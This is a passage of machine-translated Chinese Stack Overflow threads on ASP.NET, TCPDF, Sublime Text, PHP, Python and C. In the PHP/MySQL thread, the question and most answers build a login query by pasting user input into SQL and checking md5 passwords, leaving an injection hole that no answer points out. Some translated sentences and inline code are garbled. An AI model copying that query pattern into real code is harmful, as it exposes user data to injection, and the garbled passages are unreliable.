请注意**`HTTP/1.1 301 MovedPermanently`**。你确定你收到了`404`而不是`301`？这是通常的网络实践，301 标头意味着内容被放置在其他位置，用户（浏览器）应该导航到它。

另外请确保`HttpURLConnection`允许重定向。

# c# - asp.net 更新面板和回发

> ID：11309171
> 
> 赞同：1
> 
> 时间：2012-07-03T10:39:06.607
> 
> 标签：c#, asp.net, updatepanel, postback

我有一个 DDL 和 Button，单击它会创建一个动态表；所有控件都在一个`UpdatePanel`.

在面板之外，我有 2 个按钮，在创建表格之前应该隐藏它们。如果按钮以 as 开头`visible = false`，然后我在单击 GO 按钮后将它们设置为 true `UpdatePanel`，它们将永远不可见

如果我添加第二个 UpdatePanel 并将 2 个按钮放在那里它有点工作但我总是在单击任一按钮时收到此错误：

```
Microsoft JScript runtime error: Sys.WebForms.PageRequestManagerParserErrorException: 
The message received from the server could not be parsed. 
```

如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T10:44:51.073

移动更新面板内的两个按钮。只有更新面板中的控件在 Ajax 调用中得到更新。也就是说，如果您想通过 Ajax 调用中的代码隐藏来更改任何控件的状态，则必须将其包含在更新面板中。您不能在 Ajax 调用中更改更新面板之外的控件。

**更新** 您需要事件处理程序。使按钮可见=true；并设置它们的可见性：隐藏，然后在您的通话完成后将它们更改如下。

```
<script type="text/javascript" language="javascript">
    Sys.WebForms.PageRequestManager.getInstance().add_beginRequest(beginRequestHandle);
      Sys.WebForms.PageRequestManager.getInstance().add_endRequest(endRequestHandle);
      function beginRequestHandle(sender, Args) {
      //Do something when call begins.
        }

function endRequestHandle(sender, Args) {
document.getElementById("Button1").style.visibility = "visible";
document.getElementById("Button2").style.visibility = "visible";
}
      </script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:56:12.240

是的，就像 Ashwin 告诉你的，如果你需要更新面板之外的按钮，你必须让按钮从 JS 中可见。如果您的页面中有脚本管理器，那么您可以调用 JS 函数，使按钮从代码隐藏中可见，如下所示

```
<script type="text/javascript" language="javascript">
   function showButtons(){
     document.getElementById("<%= Button1.ClientID %>").style.visibility = "visible";
     document.getElementById("<%= Button2.ClientID %>").style.visibility = "visible";
   }
</script> 
```

如果按钮是服务器控件，则使用代码块 <%= %> 获取按钮的客户端 ID。在创建动态表后的代码隐藏中使用这个

```
 ScriptManager.RegisterStartupScript(this.Page, this.Page.GetType(), "showButtons", "showButtons();", true); 
```

# google-docs - 合并被其他客户端修改的 google docs 文档。（谷歌驱动SDK）

> ID：11309172
> 
> 赞同：1
> 
> 时间：2012-07-03T10:39:07.310
> 
> 标签：google-docs, google-drive-api

合并 google docs 文档的首选或最佳程序是什么，已经由另一个客户端通过 Google Drive SDK 修改？

在我的情况下，只会有文本更改，没有格式差异。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-04T00:27:18.920

不幸的是，您将不得不自己处理这种冲突。API 确实通过提供 ETag 帮助您，服务器使用该 ETag 测试您正在更新的文件是否已在 Google Drive 中更改。如果已更改，默认情况下请求将失败。

# c# - 属性属性

> ID：11309175
> 
> 赞同：0
> 
> 时间：2012-07-03T10:39:19.103
> 
> 标签：c#, typeconverter

我有一个这样的组件

```
public class MyDatatable : Component
{
    private MyDatatable ParentTableP = null;
    public  MyDatatable ParentTable
    {
        get { return MyDatatableP; }
        set { MyDatatableP=value; }
    }

    private DataColumn ParentColumnP = null;
    public  DataColum  ParentColumn 
    {
        get { return ParentColumnP; }
        set { ParentColumnP=value; }
    }

   private DataColumnCollection ColumnsP = null;
   public  DataColumnCollection Columns
   {
       get { return ColumnsP; }
       set { ColumnsP=value; }
   }
} 
```

我编译了项目并为另一个项目添加了工具箱。我正在向表单添加组件。在我从 propertygrid 设置 Mydatatable 组件 parenttable 属性后，我想这样做，ParentColumn 在 parenttable 列的属性网格中列出

# oracle - 如何选择Oracle表单中的所有文件

> ID：11309178
> 
> 赞同：0
> 
> 时间：2012-07-03T10:39:31.450
> 
> 标签：oracle, plsql, oracleforms

我创建了一个按钮，并在其中编写了以下代码

```
declare
     l_flname varchar2(500) ;
begin
    l_flname := GET_FILE_NAME( File_Filter=> 'All Files (*.*)|*.*|',message=> 'select file to load');
    if l_flname is not null
    then
     :load.FILE_NAM := l_flname;
    else
         message('Please Select File To Load',acknowledge);
         message('Please Select File To Load',no_acknowledge);
         synchronize;
         raise form_trigger_failure;
    end if;
end; 
```

但是当我运行表单并单击按钮比我应该打开一个 Windows 并从那里我可以选择一个文件但我收到消息“选择要加载的文件”请帮帮我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-04T12:54:58.450

您可以使用 Webutil 执行相同的操作以从客户端计算机加载文件

请在下面找到可能有用的链接

[http://www.baigzeeshan.com/2010/01/open-file-dailog-box-example-using.html](http://www.baigzeeshan.com/2010/01/open-file-dailog-box-example-using.html)

[http://fdegrelle.over-blog.com/article-1810290.html](http://fdegrelle.over-blog.com/article-1810290.html)

# background-image - TCPDF 自动分页符 + 背景图像

> ID：11309182
> 
> 赞同：7
> 
> 时间：2012-07-03T10:39:36.693
> 
> 标签：background-image, tcpdf

我正忙于一个需要大量 pdf 文件的项目。因为他们都需要公司的设计，所以我使用带有徽标/水印的背景图像。

如果我只有一页，一切都很好，但是当有多个页面时，背景只在第一页。

```
$pdf->Image('bg/background.jpg', 0, 0, 210, 297, '', '', '', false, 0, '', false, false, 0);
        $pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);
$pdf->setPageMark();
$pdf->SetAutoPageBreak(true);
$pdf->writeHTML($bodyText, true, true, true, true, '');
$pdf->lastPage();
$pdf->Output('doc.pdf', 'I'); 
```

所以我的 $bodyText 超过 1 页...

有没有解决方案让每个页面都有背景？

谢谢

沃特

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-07-07T14:45:39.133

您可以使用自定义标头函数扩展 TCPDF 类，并将图像添加到标头，使用[`TCPDF::Image`](http://www.tcpdf.org/doc/classTCPDF.html#a714c2bee7d6b39d4d6d304540c761352). [在TCPDF 示例](http://www.tcpdf.org/examples/example_051.phps)中有一个关于如何执行此操作的示例

从例子：

```
// Extend the TCPDF class to create custom Header and Footer
class MYPDF extends TCPDF {
    //Page header
    public function Header() {
        // get the current page break margin
        $bMargin = $this->getBreakMargin();
        // get current auto-page-break mode
        $auto_page_break = $this->AutoPageBreak;
        // disable auto-page-break
        $this->SetAutoPageBreak(false, 0);
        // set bacground image
        $img_file = K_PATH_IMAGES.'image_demo.jpg';
        $this->Image($img_file, 0, 0, 210, 297, '', '', '', false, 300, '', false, false, 0);
        // restore auto-page-break status
        $this->SetAutoPageBreak($auto_page_break, $bMargin);
        // set the starting point for the page content
        $this->setPageMark();
    }
} 
```

并使用`MYPDF`而不是`TCPDF`像使用`TCPDF`. 我唯一不知道 PDF 正文是否可以与标题重叠，但我认为如果您明确指定边距和标题大小，它可以。

让我知道这个是否奏效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-08-07T07:05:38.667

***Mathe 的回答效果很好。***

正如 Jasmines 要求为每个 MYPDF 实例使用不同的图像，我们可以在自定义标题之前有一个函数：

```
var $image_name;

    public function SetImagePath($image_name)
    {
        $this->image_path =  K_PATH_IMAGES.$image_name;
    } 
```

然后在我们使用 MYPDF 之后，我们可以编写：

```
$pdf->setImagePath($imageName) 
```

并且，自定义标题略有变化。

```
$this->Image($this->image_path, 0, 0, 210, 297, '', '', '', false, 300, '', false, false, 0); 
```

# cassandra - 如何向 Cassandra 添加新功能？

> ID：11309184
> 
> 赞同：-2
> 
> 时间：2012-07-03T10:39:44.680
> 
> 标签：cassandra

我想将自己的功能添加到 Cassandra。

比如我想让cassandra`hello world`在启动时说（请不要告诉我可以通过修改bash-script来完成）。

```
class HelloWorldApp {
public static void main(String[] args) {
    System.out.println("Hello World!"); 
}} 
```

任何人都知道，我该怎么做？换句话说，如果我有手工制作的脚本，我怎样才能让 Cassandra 去做呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T12:29:24.673

可能是你在找这个：[如何为 Cassandra 做贡献](http://wiki.apache.org/cassandra/HowToContribute)

它解释了从下载 cassandra 源代码到提交补丁的所有内容。

首先（如果您习惯于 Eclipse），您可能会发现这很有帮助：[在 Eclipse 中运行 Cassandra](http://wiki.apache.org/cassandra/RunningCassandraInEclipse)

# sass - Sass 对 Sublime Text 2 的支持？

> ID：11309185
> 
> 赞同：70
> 
> 时间：2012-07-03T10:39:46.907
> 
> 标签：sass, sublimetext

在[Sublime Text](http://www.sublimetext.com/) 2中是否有用于编辑[Sass的现有包？](http://sass-lang.com/)

这似乎很流行： [https ://github.com/n00ge/sublime-text-haml-sass](https://github.com/n00ge/sublime-text-haml-sass)

但是，安装后，它似乎只为`scss`文件提供语法突出显示。

理想情况下，我想要语法突出显示、缩进和完成`sass`语法。

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2012-07-04T07:17:06.373

我建议你使用这个：[https](https://github.com/nathos/sass-textmate-bundle) ://github.com/nathos/sass-textmate-bundle ，如果只是为了惊人的代码完成 - 与 SASS/SCSS 兼容。

每当对包有疑问时，假设您使用了令人惊叹的 Sublime [**Package Control**](https://sublime.wbond.net/installation)，只需使用[包列表](https://sublime.wbond.net/sort-installs)，[输入一些](https://sublime.wbond.net/search/Sass)内容（结果将按安装次数排序），通常最受欢迎的就是最好的。

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2012-12-28T15:30:30.190

它仅适用于您的 scss 文件的原因是因为 Ruby HAML 突出显示设置会覆盖您的 sass 突出显示。

转到`Preferences`>`Browse Packages...`

`Ruby Haml.tmLanguage`在`Rails`文件夹中查找并打开

从以下位置更改文件类型：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>fileTypes</key>
    <array>
        <string>haml</string>
        <string>sass</string> <!-- This line is causing the problem -->
    </array>
    <key>foldingStartMarker</key>
    <string>^\s*([-%#\:\.\w\=].*)\s$</string>
    <key>foldingStopMarker</key>
    <string>^\s*$</string>
... 
```

至：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>fileTypes</key>
    <array>
        <string>haml</string>
    </array>
    <key>foldingStartMarker</key>
    <string>^\s*([-%#\:\.\w\=].*)\s$</string>
    <key>foldingStopMarker</key>
    <string>^\s*$</string>
... 
```

现在你安装的 SASS 高亮包应该可以正常工作了。

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2013-04-30T15:08:15.087

我最近发表了一篇关于此的博客文章：[如何向 Sublime Text 添加 SASS 支持](http://aspirecode.com/how-to-add-sass-support-in-sublime-text/)。

这是一个快速的总结：

*   要获得语法高亮，请安装[sass-textmate-bundle 插件](https://github.com/nathos/sass-textmate-bundle)`Sass`，在 Package Control 中简单调用。您会发现`sass`默认情况下文件不会正确突出显示，但在帖子中我详细介绍了一个两秒钟的修复，它不涉及破解任何 Sublime 的默认插件。
*   安装[SASS Build 插件](https://github.com/jaumefontal/SASS-Build-SublimeText2)以启用来自 Sublime的构建`sass`和文件。`scss`
*   添加[SublimeOnSaveBuild 插件](https://github.com/alexnj/SublimeOnSaveBuild)，它会在您将更改保存到文件时自动运行构建。

查看[博客文章](http://aspirecode.com/how-to-add-sass-support-in-sublime-text/)以获取完整的详细信息。

* * *

## 回答 #4

> 赞同：18
> 
> 时间：2013-09-21T12:32:16.277

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-02-26T03:41:49.517

如果包冲突导致麻烦（例如 Haml 问题）并且您需要编辑/覆盖包，例如从文件中删除部分`<string>sass</string>`，`Ruby HAML`那么我**强烈推荐**[包资源查看器（和编辑器）](https://github.com/skuroda/PackageResourceViewer)插件。

1.  安装`PackageResourceViewer`
2.  使用调色板来做`PackageResourceViewer: Open Resource`：

    [![](../Images/0b3e6396b90b63dbdad3cfa2f46d8456.png)](https://i.stack.imgur.com/5lSth.png)

3.  `Rails`然后选择`Ruby Haml.tmLanguage`：

    [![屏幕-2014-02-25_10.37.09.png](../Images/edf4d9bb2ff1c670cc68a80c7103e11a.png)](https://i.stack.imgur.com/nl4Zp.png)
4.  注释掉有问题的行：

    [![屏幕-2014-02-25_10.39.12.png](../Images/556b7e8a7baaba1372d4488a9a1e6f34.png)](https://i.stack.imgur.com/gpb8r.png)

5.  保存文件（这是很棒的部分，因为它会`PackageResourceViewer`自动将被覆盖的部分自动保存到正确的位置。

6.  完毕。

现在去调整其他让你烦恼的软件包中的所有小设置/默认值。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-03-12T17:06:39.913

由于额外的扩展名，我遇到了[https://github.com/n00ge/sublime-text-haml-sass](https://github.com/n00ge/sublime-text-haml-sass)无法识别 Rails 默认文件的问题。我同意 Maxime 上面的观点，即使用[https://github.com/seaofclouds/sass-textmate-bundle](https://github.com/seaofclouds/sass-textmate-bundle)是一个更好的选择，并且通过包控制安装是理想的[http://wbond.net/sublime_packages/package_control](http://wbond.net/sublime_packages/package_control)。修复 .css.sass 扩展名不被识别的方法是直接编辑 Sass 包。转到并编辑该文件。添加到块。`.css.sass``.css``Sublime Text 2 > Preferences > Browse Packages``Sass\Syntaxes\Sass.tmLanguage``<string>css.sass</string>``<array>`

```
<key>fileTypes</key>
<array>
  <string>sass</string>
  <string>css.sass</string>
  <string>scss</string>
</array> 
```

# php - php mysql 单条记录显示

> ID：11309187
> 
> 赞同：0
> 
> 时间：2012-07-03T10:40:02.057
> 
> 标签：php, mysql

很抱歉这个愚蠢的问题，但是我看不到/不足以解决这个问题：

我有一个 MYSQL 数据库和一个 php 表单，一切正常，但我不能只输出一条记录 - 可能是语法错误：

```
 $SQL = "SELECT * FROM massfelh WHERE user = $uname AND pass = md5($pword)"; - this is working
    $result = mysql_query($SQL); - this is too
    $catg = $result['categ']; - help
    $num_rows = mysql_num_rows($result); - this is ok too
    echo $catg; - for test and I can't print it on screen 
```

数据库结构：id、user、pass、categ

我只需要类别（1 或 0），但它不会显示在屏幕上。

任何帮助将不胜感激 - 请说我也很愚蠢:)

更新：

谢谢大家！！！！！！！帮了我很多。我已经为我的代码找到了最佳解决方案，但是所有回复都是正确的。再次感谢 hop 这将有助于某些人和我一样的初学者:) 再次感谢你

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T10:47:53.493

试试这个..

```
$SQL = "SELECT * FROM massfelh WHERE user = $uname AND pass = md5($pword)"; 
    $result = mysql_query($SQL);
    $result = mysql_fetch_assoc($result);
    $catg = $result['categ'];
    $num_rows = mysql_num_rows($result); 
    echo $catg; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T10:46:47.453

`LIMIT 1`如果您只期望一行，则将a 添加到您的选择中是一种很好的做法。

如果您只想选择*类别*，则仅选择它`SELECT categ FROM...`。然后你可以使用`$catg = mysql_result($result, 0);` [http://php.net/manual/de/function.mysql-result.php](http://php.net/manual/de/function.mysql-result.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T10:42:04.760

```
$result = mysql_query($SQL); - this is too
$catg   = mysql_fetch_assoc($result);
print_r($catg); 
```

`mysql_query`返回一个资源。要获取数据，您必须使用一些下一个函数： - mysql_fetch_row（将结果作为数字数组返回） - mysql_fetch_assoc（将结果作为 assoc 数组返回 - 数组的键是 db 表中的字段名称） - mysql_fetch_array（返回数字和 assoc 结果，如果你不传递第二个参数）

但如果你使用 Mysqli 扩展或 PDO_Mysql 会更好

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T10:43:33.540

如果您只需要“分类”，只需选择它。在 $result 上也使用 var_dump。

```
SELECT categ FROM massfelh WHERE user = $uname AND pass = md5($pword) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-03T10:46:04.180

目前您没有使用任何 php 函数在执行查询后退出。

```
$result = mysql_query($SQL);
$res   = mysql_fetch_assoc($result);
echo $res['columnName']; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-03T10:46:12.667

```
$SQL = "SELECT * FROM massfelh WHERE user = $uname AND pass = md5($pword)";
$result = mysql_query($SQL);
$num_rows = mysql_num_rows($result);
$catg   = mysql_fetch_assoc($result);

echo $num_rows.' rows matched';
echo '<pre>';
print_r($catg);
echo '</pre>'; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-03T10:46:21.550

你错过了`mysql_fetch_assoc`那里。它应该是

```
$SQL = "SELECT * FROM massfelh WHERE user = $uname AND pass = md5($pword)";
$query = mysql_query($SQL);
$result = mysql_fetch_assoc($query);
$catg = $result['categ'];
$num_rows = mysql_num_rows($result);
echo $catg; 
```

当然查询也可以`SELECT categ FROM massfelh WHERE user = $uname AND pass = md5($pword)`

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-07-03T10:47:11.653

`mysql_query`返回结果资源，您需要将其传递给 fetch 函数才能访问返回的数据。例如：

```
$query = mysql_query($SQL);
$result = mysql_fetch_assoc($query);
$catg = $result['categ']; 
```

不鼓励使用`mysql_`扩展并且社区已经开始弃用过程，您应该阅读`mysql_query`文档：

[http://php.net/manual/en/function.mysql-query.php](http://php.net/manual/en/function.mysql-query.php)

# php - Symfony/Silex + Facebook SDK：会话开始冲突

> ID：11309188
> 
> 赞同：2
> 
> 时间：2012-07-03T10:40:03.227
> 
> 标签：php, facebook, session, symfony, silex

如何在不更改原始源代码的情况下解决 session_start 冲突？Symfony 组件或 Silex 如何检查会话是否已经存在？

```
Notice: A session had already been started - ignoring session_start() in
myapp/vendor/symfony/http-foundation/Symfony/Component/HttpFoundation/Session/Storage/NativeSessionStorage.php on line 146 
```

编辑：这是 index.php 的前几行

```
require_once __DIR__.'/vendor/autoload.php';

/**
 * from Heroku's Facebook template
 */
require_once('AppInfo.php');
require_once('utils.php');

use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\HttpKernelInterface;
use Symfony\Component\Yaml\Parser;
use Silex\Provider\FormServiceProvider;
use Symfony\Component\Validator\Constraints as Assert;

/**
 * Currently using git submodule, will move to composer.json
 */
require_once('sdk/src/facebook.php');

$facebook = new Facebook(array(
  'appId'  => AppInfo::appID(),
  'secret' => AppInfo::appSecret(),
));

$app = new Silex\Application();
// ... 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T10:58:54.593

FB sdk[仅在尚未启动时才](https://github.com/facebook/facebook-php-sdk/blob/master/src/facebook.php#L36)启动会话。将 sdk 初始化移到启动 silex 会话的代码之后。

[这](https://github.com/symfony/HttpFoundation/blob/master/Request.php#L538)是 Symfony2 用来查看用户是否有会话的函数。本质上，它检查会话 cookie 的存在。

# php - PHP LimitIterator 失败（“不支持搜索”+“无法回退文件”）

> ID：11309190
> 
> 赞同：1
> 
> 时间：2012-07-03T10:40:05.273
> 
> 标签：php, spl, splfileobject

我使用`SplFileObject`and`LimitIterator`从位置 x 到 y 读取一个大文件的内容。

这在使用像`/home/devel/stuff/myfile.log`.

当使用类似的路径`http://mydomain.com:8090/devel/stuff/myfile.log`时不起作用。然而路径是正确的。

使用绝对路径时会失败吗？

* * *

错误消息是：

`PHP Warning: SplFileObject::rewind() [<a href='splfileobject.rewind'>splfileobject.rewind</a>]: stream does not support seeking in ...`

`PHP Fatal error: Uncaught exception 'RuntimeException' with message 'Cannot rewind file ...'`

* * *

完整代码：

```
 // $pStrFile contains the valid (yes!) path
  $oFile = new SplFileObject($pStrFile);
  // $nFrom = 80 and $nLines = 30
  $fileIterator = new LimitIterator($oFile, $nFrom, $nLines);

  foreach($fileIterator as $line) {
      $strLines .= $line;
  } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T21:24:01.890

要使`rewind()`函数在 上工作[`SplFileObject`](http://php.net/splfileobject)，底层的流包装器需要支持查找。

PHP 当前的[HTTP 流包装器](http://php.net/manual/en/wrappers.http.php)不支持搜索。因此，您会收到错误消息：

> PHP 警告：SplFileObject::rewind() [splfileobject.rewind]: 流不支持在 ...

我想到的第一个想法是使用[`NoRewindIterator`](http://php.net/NoRewindIterator)只是禁用`rewind()`呼叫并因此防止触发错误的方法。

```
$obj      = new SplFileObject('http://www.stackoverflow.com/');
$norewind = new NoRewindIterator($obj);
$limit    = new LimitIterator($norewind, 80, 30); 
```

不过，既然没有了`rewind()`，那[`LimitIterator`](http://php.net/LimitIterator)也有些上当了。这导致忽略*偏移*参数，它不会是 80 的偏移量，而只是零（无偏移量）。

为了克服这个问题，[`CachingIterator`](http://php.net/CachingIterator)可以将 a 插入到混合物中。它正好解决了这个问题：

```
$obj      = new SplFileObject('http://www.stackoverflow.com/');
$norewind = new NoRewindIterator($obj);
$caching  = new CachingIterator($norewind);
$limit    = new LimitIterator($caching, 80, 30);

foreach ($limit as $i => $line)
{
    printf("%03d: %s", $i, $line);
 } 
```

示例输出（[演示](http://codepad.viper-7.com/M8w9nW)）：

```
080: 
081: </span>
082:                 </div>
083:                 <div id="hsearch">
084:                     <form id="search" action="/search" method="get" autocomplete="off">
085:                     <div> 
```

正如您所看到的，从技术上讲，PHP SPL 附带了足够的内部工具，可以省去为 HTTP 流写入临时文件的时间。但是请记住，这里的迭代器是只向前的，这意味着你只能使用它一次。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-03T10:43:26.417

这是 http 包装器的限制。如果文件在磁盘上，您可以在任何位置访问它。如果您想在文件中间开始阅读，这是可能的。但是，当文件位于网络服务器上并且您使用 HTTP 获取它时，读取文件中间会有点困难。

您可以将文件[复制](http://php.net/copy)到临时位置，然后在其上使用 LimitIterator。

# php - PHP DOMDocument 无法处理 utf-8 字符 (☆)

> ID：11309194
> 
> 赞同：54
> 
> 时间：2012-07-03T10:40:47.303
> 
> 标签：php, utf-8, domdocument

网络服务器使用 utf-8 编码提供响应，所有文件都使用 utf-8 编码保存，并且我所知道的所有设置都设置为 utf-8 编码。

这是一个快速程序，用于测试输出是否有效：

```
<?php
$html = <<<HTML
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Test!</title>
</head>
<body>
    <h1>☆ Hello ☆ World ☆&lt;/h1>
</body>
</html>
HTML;

$dom = new DOMDocument("1.0", "utf-8");
$dom->loadHTML($html);

header("Content-Type: text/html; charset=utf-8");
echo($dom->saveHTML()); 
```

程序的输出是：

```
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Test!</title></head><body>
    <h1>&acirc;&#152;&#134; Hello &acirc;&#152;&#134; World &acirc;&#152;&#134;</h1>
</body></html> 
```

呈现为：

# â～†你好â～†世界â～†</h1>

* * *

我可能做错了什么？要告诉 DOMDocument 正确处理 utf-8，我需要更具体多少？

* * *

## 回答 #1

> 赞同：116
> 
> 时间：2012-07-03T11:47:59.990

[`DOMDocument::loadHTML()`](http://php.net/manual/en/domdocument.loadhtml.php)需要一个 HTML 字符串。

HTML`ISO-8859-1`根据其规范默认使用编码（ISO 拉丁字母编号 1）。那是因为更长，见[*6.1。HTML 文档字符集*](https://www.rfc-editor.org/rfc/rfc1866#section-6.1)。实际上，这更多的是对`Windows-1252`普通网络浏览器的默认支持。

我回溯到那么远是因为 PHP 的 DOMDocument 基于 libxml，并且带来了专为 HTML 4.0 设计的[HTMLparser 。](http://www.xmlsoft.org/html/libxml-HTMLparser.html)

我会说可以安全地假设您可以加载`ISO-8859-1`编码的字符串。

您的字符串已`UTF-8`编码。将所有高于 127 / h7F 的字符转换为[HTML 实体](http://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)就可以了。如果您不想自己做，那就是`mb_convert_encoding`目标`HTML-ENTITIES`编码的作用：

*   那些具有命名实体的角色将获得命名实体。`€ -> &euro;`
*   其他人得到他们的数字（十进制）实体，例如`☆ -> &#9734;`

下面是一个代码示例，它通过使用回调函数使进度更加明显：

```
$html = preg_replace_callback('/[\x{80}-\x{10FFFF}]/u', function($match) {
    list($utf8) = $match;
    $entity = mb_convert_encoding($utf8, 'HTML-ENTITIES', 'UTF-8');
    printf("%s -> %s\n", $utf8, $entity);
    return $entity;
}, $html); 
```

您的字符串的此示例输出：

```
☆ -> &#9734;
☆ -> &#9734;
☆ -> &#9734; 
```

无论如何，这只是为了更深入地了解您的字符串。你想让它要么转换成编码`loadHTML`就可以处理。这可以通过将所有外部转换`US-ASCII`为 HTML 实体来完成：

```
$us_ascii = mb_convert_encoding($utf_8, 'HTML-ENTITIES', 'UTF-8'); 
```

请注意您的输入实际上是 UTF-8 编码的。如果您甚至有混合编码（某些输入可能会发生这种情况），`mb_convert_encoding`则每个字符串只能处理一种编码。我已经在上面概述了如何在正则表达式的帮助下更具体地进行字符串替换，所以我现在留下更多细节。

另一种选择是*提示*编码。这可以通过修改文档并添加

```
<meta http-equiv="content-type" content="text/html; charset=utf-8"> 
```

这是一个指定字符集的 Content-Type。对于无法通过网络服务器获得的 HTML 字符串（例如，保存在磁盘上或在您的示例中的字符串中），这也是最佳实践。网络服务器通常将其设置为响应标头。

如果您不在乎放错位置的警告，您可以将其添加到字符串前面：

```
$dom = new DomDocument();
$dom->loadHTML('<meta http-equiv="content-type" content="text/html; charset=utf-8">'.$html); 
```

根据 HTML 2.0 规范，只能出现在`<head>`文档部分中的元素将自动放置在那里。这也是这里发生的事情。输出（漂亮的打印）：

```
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta charset="utf-8">
    <title>Test!</title>
  </head>
  <body>
    <h1>☆ Hello ☆ World ☆&lt;/h1>    
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2013-06-05T04:55:03.193

有一个更快的解决方法，在 DOMDocument 中加载您的 html 文档后，您只需设置（或者更好地说是重置）原始编码。这是一个示例代码：

```
$dom = new DOMDocument();
$dom->loadHTML('<?xml encoding="UTF-8">' . $html);

foreach ($dom->childNodes as $item)
    if ($item->nodeType == XML_PI_NODE)
        $dom->removeChild($item);
$dom->encoding = 'UTF-8'; // reset original encoding 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-07-03T10:52:54.790

```
<?php
  header("Content-type: text/html; charset=utf-8");
  $html = <<<HTML
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Test!</title>
</head>
<body>
    <h1>☆ Hello ☆ World ☆&lt;/h1>
</body>
</html>
HTML;

  $html = mb_convert_encoding($html, 'HTML-ENTITIES', "UTF-8");
  $dom = new DOMDocument("1.0", "utf-8");
  $dom->loadHTML($html);

  header("Content-Type: text/html; charset=utf-8");
  echo($dom->saveHTML()); 
```

输出：

```
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Test!</title></head><body>
    <h1>&#9734; Hello &#9734; World &#9734;</h1>
</body></html> 
```

# python - Python导入头疼

> ID：11309196
> 
> 赞同：2
> 
> 时间：2012-07-03T10:40:50.177
> 
> 标签：python, import

我有以下目录结构：

```
Main.py
A/
    __init__.py
    B/
        __init__.py
        C/
            __init__.py 
```

该文件`Main.py`包含代码

```
from A import B
from B import C 
```

`__init__.py`文件是空的。当我运行时，`Main.py`我收到错误消息

```
Traceback (most recent call last):
    File ...\Main.py, line 2, in <module>
    from B import C
  ImportError: No module named B 
```

是什么导致此错误消息？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-03T10:44:09.887

在处理`import`语句时，Python 不会查看您已经导入的内容；它只是查看给定模块是否存在于导入路径中。所以你需要这样写：

```
from A import B
from A.B import C 
```

# c - 如何在 C 中随机打乱链表

> ID：11309200
> 
> 赞同：1
> 
> 时间：2012-07-03T10:40:57.707
> 
> 标签：c, algorithm, list, data-structures

我有一个链接列表，我想实现一个功能：

`Random_Shuffle_List (struct node **Headptr)`- 它输出一个列表，使得每个节点都从其原始位置随机移动。

请帮助我用一种有效的算法来实现这一点。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-03T10:44:30.493

我会推荐天真的方法：

1.  建立一个指向每个节点的指针数组。
2.  随机排列数组。这比随机化链接结构更容易。
3.  通过按数组顺序遍历节点来“重新线程化”列表。

当然，这使用了相对少量的额外内存，但我认为与直接在链表上工作的方法相比，它在实现（和理解）时间以及可能还有运行时间方面更“有效”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T10:08:35.117

只需反转链表并交换中间节点和结束节点。我认为这会起作用。复杂度将是 O(n)。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-03T11:13:04.890

1.  计算链表中的节点数，比如说`n`
2.  在和之间生成两个随机整数 ( `a`, `b`)`0``n`
3.  交换两个节点`a`和`b`。
4.  重复以上`m`几次。

这不是一个好方法，但不像@unwind 的建议那样需要额外的内存。

使用@unwind 的解决方案可以做的一件事是使用窗口。

1.  修复say的窗口长度`w`
2.  选择链表中的两个随机节点，这样可以`w`形成两个不重叠的3.长度（窗口）的子列表
3.  构建两个数组，每个数组对应一个指向列表中每个音符的窗口
4.  随机播放每个窗口
5.  在两个窗口之间随机播放指针
6.  重新链接节点
7.  执行上述窗口选择、洗牌和重新链接`m`时间。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2021-05-30T14:23:16.153

一种方法是初始化一个额外的字段，该字段将包含由随机函数生成的随机数。

```
typedef struct node
{
int data;
int random;
struct node *next;
} card;

for eg, we can give
newnode->random = rand() % (100)  
,which will give random numbers up to 100 to the field.Now Ordering the 
 linked list to ascending or descending according to the random number ,will 
help us to shuffle the nodes .

for (tempnode = start; tempnode->next != NULL; tempnode = tempnode->next)
